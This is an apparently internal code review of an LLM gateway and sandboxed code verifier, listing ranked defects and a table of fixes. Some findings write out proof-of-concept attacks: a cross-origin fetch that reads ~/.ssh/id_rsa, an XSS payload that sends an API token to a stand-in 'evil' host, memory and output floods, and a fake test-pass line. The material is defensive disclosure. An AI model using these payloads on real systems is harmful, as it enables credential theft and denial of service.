# Nafs-Aql Phase 1 code review: correctness findings

Scope: `nafs-types`, `nafs-core` (backend, orchestrator, gate, calibration, domain, config), `nafs-verify` (lib, extract), `nafs-memory`, `nafs-gateway` (main, api), `nafs-eval`, `nafs-bench`, `nafs-web/assets/app.js`, `config/nafs-aql.toml`, checked against `docs/spec/nafs_aql_spec.tex` and `api/openapi.yaml`.

Method: I read each file in full and traced every finding back through its code path. Four findings were confirmed against the running system or a reproduction:
- **H1:** a numeric replica of `Calibration::fit`.
- **H4:** a CORS preflight against the live gateway on :8080, and a check that `NAFS_AUTH_TOKENS` is unset on the live process. No verifier code was executed through the live gateway.
- **M3:** a `sandbox-exec` probe with the live gateway's `TMPDIR`.
- **M2:** the HumanEval dataset contents.

Findings are ranked most severe first.

---

## High

### H1. A 10-item calibration fit is promoted to the live gate and can switch off escalation entirely

- **Where:** `nafs-eval/src/lib.rs:449-466` (`fit_calibration`, minimum 10 items), `nafs-core/src/calibration.rs:59-61,94-95` (`is_fitted` = `n > 0`; ECE computed on the training set), `nafs-core/src/gate.rs:74-75`, `nafs-gateway/src/api.rs:596-605`.
- **Defect:** The calibrated rule is activated whenever `n > 0 && ece <= 0.05`. This has two problems:
  - The ECE is measured in-sample on the items the model was just fitted to.
  - The spec's promotion condition (NFR-020: 5 bins, n >= 2,900, ECE <= 0.05) is never checked.
- **Failure scenario:** Run `smoke_mixed` or `gsm8k` with about 10 items where every nafs_aql draft passes, then click "Fit calibration from this run".
  - Logistic regression on all-negative labels drives p to about 0. A replica of the fit gave in-sample ECE 0.0003 and max p 0.0017, so the fit is promoted.
  - For later non-verifiable requests, ê1 is about 0.0003 even for drafts with mean log-prob -1.5 and full sample disagreement.
  - So `L(ê1 - ê2) = 0.0003 - 0.35 < 0`, and the gate never escalates any open, factual, code or math request without verification inputs.
- **Fix:**
  - Require `cal.n >= 2900` (or a configured minimum) both in `gate::decide` and when reporting "active".
  - Compute ECE on a held-out split (or by cross-validation), not on the training items.
  - Refuse to fit when one class has fewer than about 30 examples.

### H2. Sandbox output is buffered without limit inside the gateway process

- **Where:** `nafs-verify/src/lib.rs:320-345` (`child.wait_with_output()`, then truncation to `max_output_bytes`).
- **Defect:** All stdout and stderr is collected into memory before it is truncated to 2 KB. `RLIMIT_FSIZE` does not apply to pipes.
- **Failure scenario:** A candidate or test containing `while True: print("x" * 10**6)` writes about 1 GB/s into the pipe for up to 10 s of CPU (30 s wall clock). The gateway accumulates many GB of RAM on a 32 GB host that is also serving the models, which risks OOM or swapping that takes down llama-server.
  - Reachable from model output in any code-verified request.
  - Reachable directly through `POST /v1/verify`.
- **Fix:** Read stdout and stderr incrementally into a bounded ring buffer (keep the last N bytes). Kill the child once a hard byte cap is exceeded.

### H3. Byte-slicing the sandbox output can panic on a UTF-8 boundary

- **Where:** `nafs-verify/src/lib.rs:340-341`: `text[text.len() - limits.max_output_bytes..]`.
- **Defect:** A `String` is sliced at an arbitrary byte offset. If that offset falls inside a multi-byte character, Rust panics.
- **Failure scenario:** `POST /v1/verify` with answer `` ```python\nprint('é'*2000)\nraise SystemExit(1)\n``` `` and `tests: ["pass"]`.
  - Output is 4,001 bytes, so the cut is at offset 1,953, which is inside an `é`. The code panics.
  - The same happens for any failing test whose output exceeds 2 KB and contains non-ASCII text (Arabic or Indonesian strings, curly quotes).
  - The effects depend on where the verifier was running:
    - `/v1/chat`: the connection is reset.
    - `/v1/chat/stream`: the stream ends with no `done` or `error` event (see M10).
    - Eval: the spawned run task dies and the run stays `running` forever, with its cancel entry leaked.
    - Room: the turn is lost.
- **Fix:** Find a char boundary first (`let mut i = len - max; while !text.is_char_boundary(i) { i += 1 }`), or truncate the raw bytes before `from_utf8_lossy`.

### H4. Any web page can execute Python on the operator's machine and read local files

- **Where:**
  - `nafs-gateway/src/api.rs:161`: `CorsLayer::permissive()`.
  - `api.rs:183-186`: authentication is disabled when `NAFS_AUTH_TOKENS` is unset. This is the shipped default, and the live process has it unset.
  - `nafs-verify/src/lib.rs:357`: the sandbox profile is `(allow default)` with only network and writes denied, so every file is readable.
- **Defect:** Verification is unauthenticated, CORS allows any origin, and the sandbox allows reading the whole filesystem. Together, any origin can run code through `/v1/verify` and read the result.
- **Failure scenario:** The operator visits a malicious page in Safari or Firefox. (Chrome may prompt for Local Network Access.) The page sends:
  - `fetch('http://127.0.0.1:8080/v1/verify', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({answer:'x=1', verification:{tests:["print(open('/Users/<u>/.ssh/id_rsa').read()); assert False"]}})})`
  - The preflight succeeds; I confirmed live that it returns `access-control-allow-origin: *`.
  - The file's last 2 KB comes back in `evidence`, readable by the page.
  - The same channel can switch backends, delete conversations, and start multi-hour eval runs.
- **Fix:**
  - Restrict CORS to the gateway's own origin (or drop the layer, since the UI is same-origin).
  - Require a token for `/v1/verify` and the mutating endpoints even in dev mode, or bind those routes only when auth is configured.
  - Tighten the sandbox read policy to the sandbox directory plus the Python installation.

---

## Medium

### M1. `test_code` without `entry_point` marks any code as verified

- **Where:** `nafs-verify/src/lib.rs:176-181`, `nafs-types/src/lib.rs:100-109`.
- **Defect:** `check(<entry_point>)` is only appended when `entry_point` is set. HumanEval `test_code` only defines `check`, so without the call no assertion runs, the sentinel prints, and the result is a pass. `is_verifiable()` accepts `test_code` alone.
- **Failure scenario:** An API client sends HumanEval-style `verification: {test_code: "def check(candidate): assert candidate(1)==2"}` without `entry_point`. Any syntactically valid answer gets `assurance: verified` and the draft is never escalated (Theorem 1 is violated).
- **Fix:** Reject `test_code` without `entry_point` with a 400, or treat it as not verifiable. Also use a per-run random sentinel nonce (see L10).

### M2. `code_prefix` is skipped whenever the answer contains `def <entry_point>`, so HumanEval imports and helpers are lost

- **Where:** `nafs-verify/src/lib.rs:168-174`.
- **Defect:** The prompt asks for "the full function definition". When the model returns just the function, the prefix is not prepended. 22 of 164 HumanEval prefixes have imports before the `def` (for example `from typing import List`), and several define helper functions (for example HumanEval/10, /38, /50).
- **Failure scenario:** The model returns `def has_close_elements(numbers: List[float], ...)` without the import. `NameError: name 'List' is not defined` is raised at definition time. A correct draft is rejected, escalated, retried, and possibly abstained, and eval accuracy is understated.
- **Fix:** Always prepend `code_prefix`. A prefix that ends in a docstring-only `def` is valid Python, and the model's later `def` overrides it. At minimum, prepend the prefix's import and helper lines.

### M3. The macOS sandbox profile uses a non-canonical path, so all file writes are denied, even inside the sandbox directory

- **Where:** `nafs-verify/src/lib.rs:278` (`std::env::temp_dir()`), `lib.rs:357` (`(subpath "<dir>")`).
- **Defect:** Seatbelt matches resolved paths. The live gateway's `TMPDIR` is `/var/folders/.../T/`, which resolves to `/private/var/...`, so `require-not (subpath "/var/...")` denies every write.
- **Failure scenario (reproduced with sandbox-exec):**
  - With the `/var/folders/...` profile, writing a file inside the directory gives "Operation not permitted".
  - With the `/private/var/...` profile, the same write succeeds.
  - Any solution or test that uses `tempfile`, `open(..., 'w')` or sqlite fails, which produces false rejections and spurious escalation.
- **Fix:** Canonicalize the sandbox directory (`std::fs::canonicalize(&dir)`) before building the profile and setting `TMPDIR`/`HOME`.

### M4. Sandbox limit gaps: no memory limit on macOS, no process limit, grandchildren survive

- **Where:** `nafs-verify/src/lib.rs:293-316`, `lib.rs:367-380`.
- **Defect:**
  - `RLIMIT_AS` is set only on Linux; the spec (FR-035) requires 512 MB, and the code uses 1 GiB on Linux.
  - There is no `RLIMIT_NPROC`.
  - `kill_on_drop` kills only the direct child.
  - Without `sandbox-exec` or `unshare`, the code silently falls back to an unsandboxed interpreter even though `deny_network = true`.
  - On Linux there is no file-write restriction at all.
- **Failure scenarios:**
  - On the macOS host, `x = []` followed by `while True: x += [0]*10**8` allocates tens of GB within the 10 s CPU budget, next to the live models.
  - `os.fork()` in a loop, or `subprocess.Popen(['sleep','3600'])`, leaves orphans after the timeout.
- **Fix:**
  - Run the child in its own process group (`setsid` in `pre_exec`) and kill the group.
  - Set `RLIMIT_NPROC`.
  - On macOS, enforce memory by RSS polling or `RLIMIT_DATA`.
  - Fail closed (return a verifier-unavailable rejection) when the configured isolation is not available.

### M5. Stored XSS in the Evaluation page through eval system names

- **Where:** `nafs-web/assets/app.js:516` (`${SYS_LABEL[k] || k}`), `app.js:525` (`${SYS_LABEL[i.system] || i.system}`), with no validation in `nafs-eval/src/lib.rs:28-47,114-120`.
- **Defect:** Unknown system names are accepted (they run as `nafs_aql`) and inserted into `innerHTML` unescaped.
- **Failure scenario:** `POST /v1/eval/runs {"benchmark":"smoke_mixed","max_items":1,"systems":["<img src=x onerror=fetch('//evil/?'+localStorage['nafs.token'])>"]}`.
  - The Evaluation page auto-watches `runs[0]`, so the payload runs for every operator who opens the page and steals the stored API token.
  - When combined with H4, no token is needed to plant it.
  - Line 480 has the same issue for dataset domain names from local files (lower risk).
- **Fix:** Validate `systems` against `{nafs_aql, fast_only, slow_only}` on the server, and wrap these interpolations in `esc()`.

### M6. A lagging room member silently stops receiving all frames

- **Where:** `nafs-gateway/src/api.rs:380-386`: `while let Ok(msg) = rx.recv().await`.
- **Defect:** `broadcast::Receiver::recv` returns `Err(Lagged)` when the client falls 4,096 frames behind, and the loop treats that as fatal. The socket stays open and the member is still counted, but nothing more is forwarded.
- **Failure scenario:** Rooms stream reasoning by default (`show_reasoning` defaults to true, `api.rs:429`). Each S2 attempt produces up to about 1,800 token frames, plus 512 draft frames. With two queued turns, a member on a slow link lags past 4,096 frames and never sees the `done` frame or any later message. Their UI shows "live" forever.
- **Fix:** Match `RecvError::Lagged(_)` and `continue`, optionally after sending a "resync" frame. Break only on `Closed`.

### M7. WebSocket room messages bypass rate limiting and queue unlimited assistant turns

- **Where:** `nafs-gateway/src/api.rs:387-440`. Rate limiting in `auth`, `api.rs:199-209`, runs only on the HTTP upgrade.
- **Defect:** Every `user_message` frame spawns a task that waits on the room's `busy` mutex, with no per-connection or per-room cap (NFR-011).
- **Failure scenario:** One authenticated socket sends 10,000 frames. That creates 10,000 queued tasks, each of which will later run a full draft plus deliberation (minutes each on this CPU). The backends are monopolized for days, and messages are broadcast to everyone.
- **Fix:** Apply the token bucket per frame, cap the queue depth per room (reject with an `error` frame), and drop queued turns whose sender disconnected.

### M8. Client disconnect cancels only between System 2 attempts, and the in-flight generation keeps holding backend permits

- **Where:** `nafs-core/src/orchestrator.rs:390-392` (the only `em.closed()` check), `nafs-core/src/backend.rs:176-256` (the stream loop never checks for cancellation), `nafs-gateway/src/api.rs:247-255`.
- **Defect:** When the SSE client disconnects or clicks Stop, the task continues:
  - through the draft and samples,
  - through the whole current S2 stream (up to 1,024 + 768 tokens, about 3-4 minutes on this CPU),
  - and then returns `Err("client disconnected")` without persisting anything.
- **Failure scenario:**
  - A user clicks Stop during deliberation and re-asks. Their new request queues behind their own abandoned generation, because S2 has `max_in_flight = 2`.
  - Whether the abandoned answer is saved depends on timing: it is saved if the disconnect came during the last attempt, and discarded otherwise.
- **Fix:**
  - Pass a cancellation signal (for example `tx.closed()` or a `CancellationToken`) into `Backend::stream` and `select!` on it in the event loop.
  - Check it after the draft as well.
  - Decide explicitly whether disconnected requests persist.

### M9. Routing and calibration metrics in eval reports are computed from values that already contain the label

- **Where:** `nafs-core/src/gate.rs:70-73` (`e1: 0.0` when the draft passed), `nafs-eval/src/lib.rs:384-420` (`ps.push(r.e1_hat)`, oracle from `r.draft_correct`).
- **Defect, part 1:** For verifiable items, the recorded `e1_hat` is forced to 0.0 when the draft passed and is the model's estimate when it failed. The reliability diagram, `ece_e1` and `brier_e1` therefore score a predictor that has seen the outcome.
- **Defect, part 2:** The gate's decision on verifiable items is `escalate = !draft_passed`, which is the same label the oracle uses. Routing accuracy therefore equals `1 - P(draft wrong and slow wrong)`; it is not a measure of the gate.
- **Failure scenario:** gsm8k with 100 items, 70 passing drafts:
  - 70 points sit at (0, 0) and 30 at (ê1 ≈ 0.2, 1).
  - The reported ECE is far lower than the estimator's true ECE.
  - "Routing accuracy >= 70% (H1)" passes regardless of ê1.
  - Every shipped eval dataset is fully verifiable, so every report is affected.
- **Fix:**
  - Record the raw `cal.e1(&features)` separately from the decision's effective e1, and use the raw value for ECE, Brier and reliability.
  - Compute routing accuracy only on items where the gate actually used ê1 (non-verifiable items, or a "hide verifier from gate" eval mode).

### M10. Abnormal stream end leaves the UI turn "live" forever

- **Where:** `nafs-gateway/src/api.rs:247-255` (a task panic drops `tx` without sending `error`), `nafs-web/assets/app.js:51-61,206,380`.
- **Defect:** If the orchestrator task panics (for example H3) or is otherwise dropped, the SSE body ends cleanly. `api.stream` then returns normally with no `done` and no `error`, so the `Turn` never leaves the live state. Its 500 ms ticker runs indefinitely and the spinner stays visible.
- **Failure scenario:** Trigger H3 from chat. The send button resets but the turn spins forever, and there is no error shown.
- **Fix:**
  - Server: run `handle` inside a `JoinHandle` and map `JoinError` to an `error` event.
  - Client: after `api.stream` resolves, call `turn.on('error', {data: {message: 'stream ended unexpectedly'}})` if `!turn.reply && !turn.error`.

### M11. Gate samples are truncated at 160 tokens and still used for agreement and consensus

- **Where:** `nafs-core/src/orchestrator.rs:247-251` (`sample_max_tokens = 160`), `nafs-core/src/gate.rs:18` (filters only empty content), `nafs-verify/src/extract.rs:100-103`.
- **Defect:** The math instruction asks for step-by-step work ending in `Answer:`. Samples cut off by `max_tokens` (`finish_reason == "length"`) fall back to the last intermediate number, so `answer_similarity` is 0 against a complete draft.
- **Failure scenario:** A non-verifiable math question in chat whose 1.7B solution is about 200 tokens.
  - Both samples are truncated, so agreement is 0.
  - The fixed rule escalates (0 < 0.5 + 0.4·care) even when the draft and both samples would agree. This inflates escalation.
  - The `consensus` level is effectively unreachable for math.
- **Fix:** Drop samples with `finish_reason == "length"` from the agreement computation, or use the same `max_tokens` as the draft for math and code.

### M12. Answer extraction misreads LaTeX fractions, expressions and hyphenated ranges

- **Where:** `nafs-verify/src/extract.rs:78-83,89-99,100-103`, `nafs-verify/src/lib.rs:257-274`.
- **Defects and failure scenarios:**
  - `\boxed{\frac{1}{2}}` extracts `\frac{1}{2}`. `parse_number` sees no `/` and returns 1.0, so a correct answer fails against reference `0.5` or `1/2`. The same happens for `\dfrac` and `3\sqrt{2}`.
  - `Answer: 12 × 3 = 36` returns the first number in the line, 12, so a correct answer fails.
  - The fallback "last number" regex treats a hyphen as a minus sign. `pages 10-12` gives -12 and a date ending `2024-05-01` gives -1. This affects truncated samples (M11) and answers without an `Answer:` line.
  - A Unicode minus (`−5`) is read as 5.
- **Fix:**
  - Convert `\frac{a}{b}` / `\dfrac{a}{b}` to `a/b` before parsing.
  - On the `Answer:` line, prefer the number after the last `=`, or the last number.
  - Require a non-digit before `-` (`(?:^|[^\d\w])-`).
  - Normalize U+2212 to `-`.

### M13. The WebSocket `?token=` value is not URL-decoded, so tokens with `+ / =` fail

- **Where:** `nafs-gateway/src/api.rs:192-195` (raw query split), `app.js:411` (`encodeURIComponent(tok)`).
- **Failure scenario:** A base64 token such as `openssl rand -base64 24` contains `+`, `/` or `=`. The UI sends `%2B`, `%2F` or `%3D`, and the server compares the still-encoded string against the token list. Every room connection gets a 401 and shows "disconnected"; HTTP calls with the header work.
- **Fix:** Parse the query with `form_urlencoded`, or use `Query<...>` and percent-decode before comparing.

### M14. No validation of `thinking_budget`, `max_tokens` or `lambda`, and integer wrap in release builds

- **Where:** `nafs-core/src/orchestrator.rs:200-205,240,401`. The OpenAPI contract (`api/openapi.yaml:713-756`) specifies lambda 0..1, max_tokens 1..4096, thinking_budget 16..8192.
- **Defect:** Out-of-range values are accepted. `budget + answer_max_tokens` is a `u32` add, which wraps silently in the release binary and would panic in debug.
- **Failure scenarios:**
  - `thinking_budget: 4294967295` produces `max_tokens = 767` while the server is told budget 4294967295, so every attempt runs out of tokens and the request abstains.
  - `thinking_budget: 0` gives no reasoning.
  - `max_tokens: 1000000` is forwarded to the backend.
  - `lambda: 5` is silently accepted (the clamp is 0..10, not 0..1).
  - `/v1/chat/stream` reports every validation failure as HTTP 200 with an `error` event, while the OpenAPI document declares 400.
- **Fix:** Validate against the OpenAPI bounds in the handler (before spawning, for the stream endpoint) and return `E_BAD_REQUEST`. Use `saturating_add`.

---

## Low

### L1. Verified drafts are labelled `calibrated` even when the fixed rule is in force

- **Where:** `nafs-core/src/gate.rs:71`.
- **Defect:** The rule is `if cal.is_fitted() { Calibrated }`, ignoring `gate.mode` and the ECE test.
- **Scenario:** `mode = "fixed"`, or a fit that failed ECE, still records `rule: calibrated` on decision records (FR-013 audit trail).
- **Fix:** Reuse the `calibrated` boolean from line 75.

### L2. A `retry` event is emitted after the final attempt

- **Where:** `nafs-core/src/orchestrator.rs:466-471,500-504`.
- **Scenario:** On the last failing attempt the client receives `retry`. The UI logs "attempt rejected; retrying" and clears the candidate text (`app.js:218`), but no retry follows; the next event is `done` with `abstained`.
- **Fix:** Emit `retry` only when `attempt < total`.

### L3. Escalation rate counts `mode == slow`, so degraded escalations are missed

- **Where:** `nafs-memory/src/lib.rs:270` (`SUM(mode='slow')`), `nafs-eval/src/lib.rs:303`.
- **Defect:** In degraded mode the decision escalated but `reasoning_mode = fast`.
- **Scenario:** When S2 is down, the self-model and eval report 0% escalation.
- **Fix:** Use the `escalated` column or field.

### L4. Eval cancellation is reported as `done`, and the progress report is O(n²) on the async runtime

- **Where:** `nafs-eval/src/lib.rs:146-148,235-239`, `nafs-gateway/src/api.rs:571-591`.
- **Defect:** A cancelled run is stored as `status: done` with `progress.done < total`. Every item also rebuilds the full report, which includes 3 × 2,000 bootstrap resamples over all pairs, and re-serializes all items to SQLite on a tokio worker.
- **Scenario:** For gsm8k × 3 systems this is about 4,000 rebuilds of up to 1,319 pairs, which costs CPU minutes on the 4-core host and gigabytes of cumulative WAL writes.
- **Fix:**
  - Store `status: cancelled`.
  - Skip the bootstrap in progress snapshots (or throttle them as bench does).
  - Run the report in `spawn_blocking`.

### L5. No total timeout on non-streaming backend calls, and eval runs bypass the wall-clock cap

- **Where:** `nafs-core/src/backend.rs:259-266` (the reqwest client has only `connect_timeout`), `nafs-eval/src/lib.rs:162` (calls `orch.handle` directly, not `run_with_cap`).
- **Scenario:** A wedged S1 server that accepts connections but never answers `complete()` blocks `tokio::join!` in the draft phase forever. An eval run then never progresses and never finishes.
- **Fix:** Set a per-request timeout on `complete()` (for example `stream_idle_timeout_ms`) and wrap eval and bench calls with the wall-clock cap.

### L6. The in-flight backend gauge leaks when a stream future is dropped

- **Where:** `nafs-core/src/backend.rs:176-183`.
- **Defect:** The `decrement` runs only if `stream_inner` completes.
- **Scenario:** `run_with_cap` times out (`api.rs:226-231`), the future is dropped, and `nafs_backend_inflight` stays permanently +1.
- **Fix:** Use an RAII guard that decrements in `Drop`.

### L7. Inline `<think>` content is streamed as answer tokens

- **Where:** `nafs-core/src/backend.rs:232-238,346-356`.
- **Defect:** When the server does not split reasoning out, `finish()` strips it afterwards, but every reasoning token has already gone to the sink as `reasoning: false`.
- **Scenario:** With `show_reasoning = false`, the client still receives the whole chain of thought as answer text, and the final `done` content then differs from the streamed text.
- **Fix:** Track `<think>`/`</think>` state in the stream loop and route those deltas as reasoning.

### L8. UI route race and leaked timers

- **Where:**
  - `app.js:174-181`: `route()` has no generation guard.
  - `app.js:206,407,425`: room `Turn` tickers are cleared only on `done` or `error`.
- **Scenarios:**
  - Click Evaluation and then System before `/v1/eval/datasets` returns. The eval render resumes, overwrites the System view (the title still says System), and installs its poll.
  - Switching rooms, or leaving Rooms, during an answer leaves each in-flight `Turn` re-rendering a detached node every 500 ms forever.
- **Fix:** Capture a route token and abort the render if it changes after each `await`. Give `Turn` a `dispose()` that is called from `join()` and the cleanup function.

### L9. Decision links fail when auth is on

- **Where:** `app.js:274,528`.
- **Defect:** `<a href="/v1/decisions/..." target="_blank">` sends no Bearer header.
- **Scenario:** With `NAFS_AUTH_TOKENS` set, the link returns a 401 JSON page.
- **Fix:** Fetch the decision with `api.get` and show it in the modal.

### L10. The sentinel can be spoofed by candidate code

- **Where:** `nafs-verify/src/lib.rs:189-193`.
- **Defect:** The fixed marker `NAFS_ALL_TESTS_PASSED` is appended after the candidate code.
- **Scenario:** `print('NAFS_ALL_TESTS_PASSED'); import os; os._exit(0)` at module level passes without running any test.
- **Fix:** Use a random per-run nonce. Put the tests in a separate file that imports the solution, and check the nonce only on stdout before stderr is appended.

### L11. Extraction picks the wrong block in some answers

- **Where:** `nafs-verify/src/extract.rs:20-26,39-45`.
- **Scenarios:**
  - `extract_code` picks the last block containing `def `. A solution followed by a `def test_...` block verifies only the test block, which gives a NameError and a false rejection.
  - `extract_json` takes the first `[` or `{` anywhere. "See [1]: {...}" yields `[1]`, and top-level scalars that a schema allows (`42`, `"x"`) are never found.
- **Fix:**
  - Concatenate all python blocks.
  - Try every balanced candidate until one parses.
  - Fall back to `serde_json::from_str(answer.trim())`.

### L12. The chat UI always overrides the per-domain thinking budget

- **Where:** `app.js:290,375`.
- **Defect:** `thinking_budget: S.budget` (default 1024) is sent on every request.
- **Scenario:** The config caps (512 for structured, factual, open and other) never apply to UI traffic, and the open-domain slow path costs twice the configured budget.
- **Fix:** Add a "per domain" option (as on the eval page) and omit the field when it is selected.

### L13. An abstain with no System 2 output labels the shown answer as "not used"

- **Where:** `nafs-core/src/orchestrator.rs:536-541,571-575`, `app.js:238`.
- **Scenario:** All attempts produce empty content, so `final_text` is the draft and `reply.draft` is also the draft. The UI shows the answer and a fold "System 1 draft · not used" containing the same text.
- **Fix:** Set `draft: None` when the final text is the draft, or change the label.

---

## Checked and found correct

- **SQL:** every query is parameterized; no string-built SQL. Foreign-key cascade on conversation delete works because the PRAGMA is on the single shared connection.
- **Dataset path traversal:** `load_tasks` restricts names to alphanumerics plus `_` and `-`. Static asset names are fixed strings.
- **Markdown renderer:** `md()` escapes before every regex substitution.
  - Links are limited to `https?://`, and quotes are entity-encoded, so attribute breakout is impossible.
  - Code blocks, math, tables and headings all pass through `esc()`.
  - Conversation titles, room names, verifier evidence, reasoning and notices are escaped wherever they are interpolated.
- **No locks held across `.await`:**
  - The std `Mutex`es in `Store`, `rooms`, `rate` and `cancels` are never held across an await.
  - The tokio room `busy` guard is held across the turn on purpose.
- **`expect`/`unwrap` sites in the orchestrator are unreachable:**
  - "draft exists when not escalating": a forced-slow request always escalates.
  - "verifiable inputs produce a verdict": the conditions in `hub.verify` exactly mirror `is_verifiable()`.
  - `states.last()`: the vector is always non-empty.
- **Lemma 1 call bound:** the loop runs `per_round × (max_r + 1)` attempts. Non-verifiable requests are capped at R ≤ 1 (FR-022). `model_calls` = 1 + k + S2 attempts.
- **Backend retry:** retries only on connection errors and 5xx, never on 4xx. Backoff uses full jitter and is capped (IF-007).
- **Semaphore and permits:** each call holds one permit, so draft and samples cannot deadlock across concurrent requests.
- **Statistics primitives:**
  - The equal-mass ECE binning and reliability bins are correct.
  - Nearest-rank quantiles are correct.
  - Bootstrap indices 50 and 1949 of 2,000 match the 2.5 and 97.5 percentiles.
  - Paired differences use only tasks scored under both systems.
- **Prompt assembly** drops whole turns from the oldest end and keeps the prefix stable.
- **Budget forcing:** llama-server accepts `thinking_budget_tokens` per request (confirmed in `third_party/llama.cpp/tools/server/server-common.cpp:1443-1444`).
- **OpenAPI StreamEvent** includes `start` and `phase`, matching the serde tags. The error code and HTTP status mapping matches the spec error taxonomy, including 429 with `Retry-After`.

---

## Resolution (18 October 2026)

All 31 findings are fixed. "Test" names the automated check that pins the fix down; "live" means it was also checked against the running gateway.

| ID | Fix | Test |
|----|-----|------|
| H1 | Calibration is fitted with 5-fold cross-validation plus isotonic post-correction. Promotion requires held-out ECE <= 0.05, n >= `calibration_min_n` (2,900) and >= 30 drafts of each class. A failing fit is saved as a candidate and never replaces the active one. The gate uses the calibrated rule only when the active fit is promoted. The 10-item Phase-1 fit was retired. | `gate::tests::small_or_one_class_fits_are_never_promoted`, `calibration_fit_is_held_out_and_well_calibrated` |
| H2 | Sandbox output is read through bounded tail buffers (1 MiB hard cap); the process group is killed when the cap is passed. | `nafs-verify` `code_verifier_pass_fail_and_limits` |
| H3 | All truncation is char-boundary safe (`tail_chars`). | `nafs-verify` tests with multi-byte output |
| H4 | The permissive CORS layer is gone. A same-origin guard returns 403 for any foreign `Origin` (WebSocket included) and, with auth off, for a `Host` that is not this machine. The sandbox denies reads under /Users, /Volumes, /private/var/folders and /private/tmp outside its own directory. The UI sends a strict Content-Security-Policy. | `sandbox_denies_network_home_reads_and_forks`; live: cross-origin POST, rebinding Host and `~/.zshrc` read all refused |
| M1 | `test_code` counts as tests only together with `entry_point`; malformed inputs get 400. | `test_code_needs_entry_point`, `out_of_range_requests_are_rejected` |
| M2 | `code_prefix` is always prepended (with a `pass` guard) and the candidate is imported by a separate runner. | `nafs-verify` HumanEval-prefix test |
| M3 | The sandbox directory is canonicalised before the profile is written. | `code_verifier_pass_fail_and_limits` |
| M4 | CPU, file-size and (Linux) address-space rlimits, a per-process RSS monitor, `deny process-fork`, `setsid` and process-group kill; isolation unavailable means the verifier fails closed. | `sandbox_denies_network_home_reads_and_forks` |
| M5 | Evaluation systems are validated on the server (fixed set or `slow_b<N>`), and every name the UI shows goes through `esc()`. | `nafs-eval` `system_names_are_validated` |
| M6 | A lagging room member gets a `resync` frame and keeps receiving. | code review; rooms acceptance test (MVP-A7) |
| M7 | Per-connection token bucket for room messages, a room queue cap of 3 waiting turns, and turns of departed senders are dropped. | MVP-A7 plus manual flood check |
| M8 | Cancellation reaches the backend: queueing, connecting and every stream event poll a cancel flag, and dropping the response stops generation. Cancelled requests are not persisted. | `client_disconnect_cancels_generation_promptly` |
| M9 | The decision records the raw ê₁ in every case. Evaluation adds `nafs_blind` (verifier hidden from the gate), and routing is labelled "measures the gate" only there. | `verified_draft_is_kept_with_raw_e1_and_honest_rule` |
| M10 | The SSE task runs in a child task; a panic becomes an `error` event, and the UI reports a stream that ends without `done`. | code review |
| M11 | Truncated samples (`finish_reason = length`) are excluded from agreement; math and code samples get 384 tokens. | `truncated_samples_do_not_count_for_agreement` |
| M12 | LaTeX fractions and radicals (nested), Unicode minus and `×` are normalised. Expressions are kept whole and checked by SymPy in the sandbox, and the string fallback is strict. | `symbolic_math_when_sympy_available`, math extraction tests |
| M13 | The WebSocket `?token=` value is percent-decoded. | `token_query_is_percent_decoded` |
| M14 | Bounds from the OpenAPI document (lambda 0..1, max_tokens 1..4096, thinking_budget 16..8192, 1..400 messages) are enforced before streaming starts (HTTP 400), with `saturating_add`. | `out_of_range_requests_are_rejected`; contract test "live bounds" |
| L1 | A verified draft is labelled `calibrated` or `budget` only when the calibration is promoted and the mode is not fixed. | `verified_draft_is_kept_with_raw_e1_and_honest_rule` |
| L2 | `retry` is emitted only when another attempt follows. | `no_retry_event_after_the_last_attempt` |
| L3 | Escalation rates use the gate decision, so degraded escalations count. | code review |
| L4 | Cancelled runs are stored as `cancelled`. Runs left running by a restart become `interrupted`. Progress snapshots skip the bootstrap and are throttled to one every 2 s. Final reports are built in `spawn_blocking`. | code review |
| L5 | Non-streaming backend calls have a total timeout, and eval and bench requests use the wall-clock cap. | code review |
| L6 | The in-flight gauge is an RAII guard. | code review |
| L7 | Inline `<think>` spans are split out of the stream, including tags cut across chunks. | `inline_think_is_routed_as_reasoning_even_when_tags_are_split` |
| L8 | Route renders carry a generation token, and each page gets a fresh view element. Turn tickers stop when their node leaves the page and are disposed on room switches. | manual UI check |
| L9 | Decision records open in a modal through the authenticated API client. | manual UI check |
| L10 | Each run uses a random nonce, read from stdin by a separate runner and checked as the last stdout line. | `printed_sentinel_cannot_spoof_a_pass` |
| L11 | Code extraction prefers the block defining the target and keeps helper blocks. JSON extraction tries every balanced candidate and the whole text. | `nafs-verify` extraction tests |
| L12 | The chat budget selector defaults to "per domain" and omits the field. | manual UI check |
| L13 | `draft` is omitted when it equals the final answer. | `no_retry_event_after_the_last_attempt` |
